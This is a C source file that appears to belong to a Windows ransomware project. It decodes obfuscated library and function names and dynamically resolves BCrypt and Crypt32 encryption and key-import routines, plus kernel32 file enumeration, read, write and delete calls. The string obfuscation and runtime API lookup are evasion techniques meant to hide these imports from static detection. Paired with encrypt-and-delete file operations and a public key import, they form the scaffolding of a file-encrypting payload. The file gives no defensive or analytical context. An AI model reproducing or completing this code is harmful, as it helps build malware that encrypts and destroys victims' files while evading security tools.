#include "api.h"
#include "obfuscate.h"
#include <stdio.h>

tBCryptOpenAlgorithmProvider        pBCryptOpenAlgorithmProvider = NULL;
tBCryptCloseAlgorithmProvider       pBCryptCloseAlgorithmProvider = NULL;
tBCryptGenRandom                    pBCryptGenRandom = NULL;
tBCryptGenerateSymmetricKey         pBCryptGenerateSymmetricKey = NULL;
tBCryptEncrypt                      pBCryptEncrypt = NULL;
tBCryptDestroyKey                   pBCryptDestroyKey = NULL;
tBCryptImportKeyPair                pBCryptImportKeyPair = NULL;
tCryptStringToBinaryA               pCryptStringToBinaryA = NULL;
tCryptDecodeObjectEx                pCryptDecodeObjectEx = NULL;
tFindFirstFileA                     pFindFirstFileA = NULL;
tFindNextFileA                      pFindNextFileA = NULL;
tFindClose                          pFindClose = NULL;
tCreateFileA                        pCreateFileA = NULL;
tReadFile                           pReadFile = NULL;
tWriteFile                          pWriteFile = NULL;
tCloseHandle                        pCloseHandle = NULL;
tDeleteFileA                        pDeleteFileA = NULL;
tGetFileSize                        pGetFileSize = NULL;
tLocalFree                          pLocalFree = NULL;

BOOL load_functions(void) {
    char dll_bcrypt[64], dll_crypt32[64], dll_kernel[64];
    decodeString(s_bcrypt_dll,   s_bcrypt_dll_len,   dll_bcrypt);
    decodeString(s_crypt32_dll,  s_crypt32_dll_len,  dll_crypt32);
    decodeString(s_kernel32_dll, s_kernel32_dll_len, dll_kernel);

    HMODULE hBcrypt  = LoadLibraryA(dll_bcrypt);
    HMODULE hCrypt32 = LoadLibraryA(dll_crypt32);
    HMODULE hKernel  = LoadLibraryA(dll_kernel);
    if (!hBcrypt || !hCrypt32 || !hKernel) return FALSE;

    pBCryptOpenAlgorithmProvider  = (tBCryptOpenAlgorithmProvider)  GetProcAddress(hBcrypt,  getOriginalString(s_BCryptOpenAlgorithmProvider,  s_BCryptOpenAlgorithmProvider_len));
    pBCryptCloseAlgorithmProvider = (tBCryptCloseAlgorithmProvider) GetProcAddress(hBcrypt,  getOriginalString(s_BCryptCloseAlgorithmProvider, s_BCryptCloseAlgorithmProvider_len));
    pBCryptGenRandom              = (tBCryptGenRandom)              GetProcAddress(hBcrypt,  getOriginalString(s_BCryptGenRandom,              s_BCryptGenRandom_len));
    pBCryptGenerateSymmetricKey   = (tBCryptGenerateSymmetricKey)   GetProcAddress(hBcrypt,  getOriginalString(s_BCryptGenerateSymmetricKey,   s_BCryptGenerateSymmetricKey_len));
    pBCryptEncrypt                = (tBCryptEncrypt)                GetProcAddress(hBcrypt,  getOriginalString(s_BCryptEncrypt,                s_BCryptEncrypt_len));
    pBCryptDestroyKey             = (tBCryptDestroyKey)             GetProcAddress(hBcrypt,  getOriginalString(s_BCryptDestroyKey,             s_BCryptDestroyKey_len));
    pBCryptImportKeyPair          = (tBCryptImportKeyPair)          GetProcAddress(hBcrypt,  getOriginalString(s_BCryptImportKeyPair,          s_BCryptImportKeyPair_len));

    pCryptStringToBinaryA = (tCryptStringToBinaryA) GetProcAddress(hCrypt32, getOriginalString(s_CryptStringToBinaryA, s_CryptStringToBinaryA_len));
    pCryptDecodeObjectEx  = (tCryptDecodeObjectEx)  GetProcAddress(hCrypt32, getOriginalString(s_CryptDecodeObjectEx,  s_CryptDecodeObjectEx_len));

    pFindFirstFileA = (tFindFirstFileA) GetProcAddress(hKernel, getOriginalString(s_FindFirstFileA, s_FindFirstFileA_len));
    pFindNextFileA  = (tFindNextFileA)  GetProcAddress(hKernel, getOriginalString(s_FindNextFileA,  s_FindNextFileA_len));
    pFindClose      = (tFindClose)      GetProcAddress(hKernel, getOriginalString(s_FindClose,      s_FindClose_len));
    pCreateFileA    = (tCreateFileA)    GetProcAddress(hKernel, getOriginalString(s_CreateFileA,    s_CreateFileA_len));
    pReadFile       = (tReadFile)       GetProcAddress(hKernel, getOriginalString(s_ReadFile,       s_ReadFile_len));
    pWriteFile      = (tWriteFile)      GetProcAddress(hKernel, getOriginalString(s_WriteFile,      s_WriteFile_len));
    pCloseHandle    = (tCloseHandle)    GetProcAddress(hKernel, getOriginalString(s_CloseHandle,    s_CloseHandle_len));
    pDeleteFileA    = (tDeleteFileA)    GetProcAddress(hKernel, getOriginalString(s_DeleteFileA,    s_DeleteFileA_len));
    pGetFileSize    = (tGetFileSize)    GetProcAddress(hKernel, getOriginalString(s_GetFileSize,    s_GetFileSize_len));
    pLocalFree      = (tLocalFree)      GetProcAddress(hKernel, getOriginalString(s_LocalFree,      s_LocalFree_len));

    return TRUE;
}

BOOL check_functions(void) {
    return TRUE;
}